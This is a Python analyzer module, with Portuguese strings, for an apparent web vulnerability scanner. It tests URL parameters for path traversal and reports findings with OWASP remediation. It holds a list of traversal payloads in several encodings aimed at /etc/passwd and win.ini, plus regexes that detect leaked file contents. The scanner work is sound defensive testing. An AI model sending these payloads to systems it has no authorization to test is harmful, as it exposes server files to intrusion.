"""Path Traversal — testa acesso a arquivos fora do diretório."""

from __future__ import annotations

import asyncio
import re
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

import httpx

from webguard.core.models import (
    Confidence, Finding, Mode, RateLimiter, ScanContext, ScanRecord, Severity,
)
from webguard.core.guard import RequestGuard
from webguard.core.registry import analyzer

# Payloads com variações de encoding
TRAVERSAL_PAYLOADS = [
    ("../../../etc/passwd", "basic unix"),
    ("....//....//....//etc/passwd", "double dot slash"),
    ("..%2f..%2f..%2fetc%2fpasswd", "URL encoded"),
    ("..%252f..%252f..%252fetc%252fpasswd", "double encoded"),
    ("....\\\\....\\\\....\\\\etc\\\\passwd", "backslash"),
    ("/etc/passwd", "absolute path"),
    ("../../../windows/win.ini", "windows win.ini"),
    ("..\\..\\..\\windows\\win.ini", "windows backslash"),
]

# Padrões que confirmam leitura de arquivo
UNIX_PATTERNS = [
    re.compile(r"root:.*?:0:0:", re.IGNORECASE),
    re.compile(r"daemon:.*?:/usr/sbin", re.IGNORECASE),
    re.compile(r"bin:.*?:/bin", re.IGNORECASE),
]

WINDOWS_PATTERNS = [
    re.compile(r"\[fonts\]", re.IGNORECASE),
    re.compile(r"\[extensions\]", re.IGNORECASE),
    re.compile(r"for 16-bit app support", re.IGNORECASE),
]


@analyzer(mode="active", name="path-traversal")
async def analyze_traversal(record: ScanRecord) -> list[Finding]:
    """Testa Path Traversal nos parâmetros da URL."""
    findings: list[Finding] = []

    parsed = urlparse(record.target_url)
    params = parse_qs(parsed.query, keep_blank_values=True)

    if not params:
        findings.append(Finding(
            id="TRAVERSAL-NO-PARAMS",
            category="traversal",
            severity=Severity.INFO,
            title="Nenhum parâmetro para testar Path Traversal",
            evidence=f"URL: {record.target_url}",
            explanation="Sem parâmetros para injetar caminhos.",
            remediation="Teste endpoints com parâmetros de arquivo manualmente.",
            reference="https://owasp.org/www-community/attacks/Path_Traversal",
            analyzer="path-traversal",
            confidence=Confidence.CONFIRMED,
        ))
        return findings

    ctx = ScanContext()
    rate_limiter = RateLimiter(mode=Mode.ACTIVE, requests_per_second=10)

    async with httpx.AsyncClient(verify=False, timeout=15.0) as client:
        guard = RequestGuard(
            mode=Mode.ACTIVE,
            target_url=record.target_url,
            rate_limiter=rate_limiter,
            ctx=ctx,
            client=client,
        )

        for param_name in params:
            finding = await _test_param_traversal(guard, parsed, params, param_name)
            if finding:
                findings.append(finding)

    if not any(f.severity in (Severity.CRITICAL, Severity.HIGH) for f in findings):
        findings.append(Finding(
            id="TRAVERSAL-NOT-FOUND",
            category="traversal",
            severity=Severity.INFO,
            title="Nenhum Path Traversal detectado",
            evidence=f"Parâmetros testados: {', '.join(params.keys())}",
            explanation="Nenhum payload retornou conteúdo de arquivo do sistema.",
            remediation="Informativo.",
            reference="https://owasp.org/www-community/attacks/Path_Traversal",
            analyzer="path-traversal",
            confidence=Confidence.INDETERMINATE,
        ))

    return findings


async def _test_param_traversal(guard, parsed, params, param_name) -> Finding | None:
    for payload, technique in TRAVERSAL_PAYLOADS:
        injected_url = _inject_param(parsed, params, param_name, payload)
        try:
            response = await guard.request("GET", injected_url, timeout=10.0)
            body = response.text

            # Verificar conteúdo unix
            for pattern in UNIX_PATTERNS:
                if pattern.search(body):
                    return Finding(
                        id=f"TRAVERSAL-{param_name.upper()[:20]}",
                        category="traversal",
                        severity=Severity.CRITICAL,
                        title=f"Path Traversal no parâmetro '{param_name}'",
                        evidence=(
                            f"Payload: {payload}\n"
                            f"Técnica: {technique}\n"
                            f"Conteúdo de /etc/passwd detectado na resposta.\n"
                            f"URL: {injected_url}"
                        ),
                        payload_sent=payload,
                        explanation="O servidor retornou o conteúdo de /etc/passwd, "
                                    "confirmando acesso a arquivos arbitrários do sistema.",
                        remediation=(
                            "Nunca use entrada do usuário para construir caminhos de arquivo.\n"
                            "Use allowlist de arquivos permitidos.\n"
                            "Normalize o caminho e verifique que está dentro do diretório base."
                        ),
                        reference="https://owasp.org/www-community/attacks/Path_Traversal",
                        analyzer="path-traversal",
                        confidence=Confidence.CONFIRMED,
                    )

            # Verificar conteúdo windows
            for pattern in WINDOWS_PATTERNS:
                if pattern.search(body):
                    return Finding(
                        id=f"TRAVERSAL-WIN-{param_name.upper()[:20]}",
                        category="traversal",
                        severity=Severity.CRITICAL,
                        title=f"Path Traversal (Windows) no parâmetro '{param_name}'",
                        evidence=(
                            f"Payload: {payload}\n"
                            f"Técnica: {technique}\n"
                            f"Conteúdo de win.ini detectado na resposta."
                        ),
                        payload_sent=payload,
                        explanation="O servidor retornou conteúdo de arquivo do Windows.",
                        remediation="Normalize caminhos e restrinja a diretório base.",
                        reference="https://owasp.org/www-community/attacks/Path_Traversal",
                        analyzer="path-traversal",
                        confidence=Confidence.CONFIRMED,
                    )

        except Exception:
            continue
        await asyncio.sleep(0.1)

    return None


def _inject_param(parsed, params, target_param, payload):
    new_params = {}
    for key, values in params.items():
        if key == target_param:
            new_params[key] = payload
        else:
            new_params[key] = values[0] if values else ""
    new_query = urlencode(new_params)
    return urlunparse((parsed.scheme, parsed.netloc, parsed.path,
                       parsed.params, new_query, parsed.fragment))
